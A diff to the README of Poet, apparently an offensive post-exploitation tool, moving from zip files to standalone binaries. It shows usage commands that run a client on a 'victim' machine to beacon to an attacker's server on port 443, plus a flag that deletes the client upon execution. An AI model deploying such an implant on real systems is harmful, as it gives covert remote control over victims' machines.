@@ -20,7 +20,8 @@ on the target including:
 ## getting started
 
 Go to the [releases](http://github.com/mossberg/poet/releases) page and
-download the latest `poet-client.zip` and `poet-server.zip` files available.
+download the latest `poet-client` and `poet-server` files available.
+
 Then skip to the Usage section below.
 
 Alternatively, you can build Poet yourself (it's pretty easy). Make sure you
@@ -32,15 +33,8 @@ $ cd poet
 $ make
 ```
 
-This will create a `build/` directory which contains `poet-client.zip`
-and `poet-server.zip`.
-
-Wondering why Poet is distributed as zip files rather than regular python
-scripts?  This is because of shared code between the client and server and the
-requirement that the client be a single file. Rather than manually keeping
-copies of the shared code in sync between files, packaging the main and shared
-code into a zip file that can be passed to the Python interpreter was a cleaner
-solution.
+This will create a `bin/` directory which contains `poet-client`
+and `poet-server`.
 
 ## usage
 
@@ -50,30 +44,25 @@ standard library. To easily try it out, a typical invocation would look like:
 Terminal 1:
 
 ```
-$ python2.7 poet-client.zip -v 127.0.0.1 1
+$ ./poet-client -v 127.0.0.1 1
 ```
 
 Terminal 2:
 
 ```
-$ sudo python2.7 poet-server.zip
+$ sudo ./poet-server
 ```
 
-Note:
-
-- You **need** to specifically pass the zip files to the Python interpreter.
-  Executing them as if they were a binaries a la `./poet-client.zip` will not
-  work.
-- By default, the server needs to be run as root (using `sudo`) because the
-  default port it binds to is 443. If that makes you uncomfortable, simply omit
-  `sudo` and use the `-p <PORT>` flag on both the client and server. Pick a
-  nice, high number for your port (> 1024).
+Note: By default, the server needs to be run as root (using `sudo`) because
+the default port it binds to is 443. If that makes you uncomfortable, simply
+omit `sudo` and use the `-p <PORT>` flag on both the client and server. Pick a
+nice, high number for your port (> 1024).
 
 Of course, using the `-h` flag gives you the full usage.
 
 ```
-$ python2.7 poet-client.zip -h
-usage: poet-client.zip [-h] [-p PORT] [-v] [-d] IP [INTERVAL]
+$ ./poet-client -h
+usage: poet-client [-h] [-p PORT] [-v] [-d] IP [INTERVAL]
 
 positional arguments:
   IP                    server
@@ -85,8 +74,8 @@ optional arguments:
   -v, --verbose
   -d, --delete          delete client upon execution
 
-$ python2.7 poet-server.zip -h
-usage: poet-server.zip [-h] [-p PORT]
+$ ./poet-server -h
+usage: poet-server [-h] [-p PORT]
 
 optional arguments:
   -h, --help            show this help message and exit
@@ -108,7 +97,7 @@ the next opportunity to connect to the server.
 Victim's Machine (5.4.3.2):
 
 ```
-$ python2.7 poet-client.zip -v 1.2.3.4 10
+$ ./poet-client -v 1.2.3.4 10
 [+] Poet started with interval of 10 seconds to port 443. Ctrl-c to exit.
 [!] (2015-03-27 03:40:12.259676) Server is inactive
 [!] (2015-03-27 03:40:22.263161) Server is inactive
@@ -123,7 +112,7 @@ $ python2.7 poet-client.zip -v 1.2.3.4 10
 Attacker's Machine (1.2.3.4):
 
 ```
-# python2.7 poet-server.zip
+# ./poet-server
                           _
         ____  ____  ___  / /_
        / __ \/ __ \/ _ \/ __/
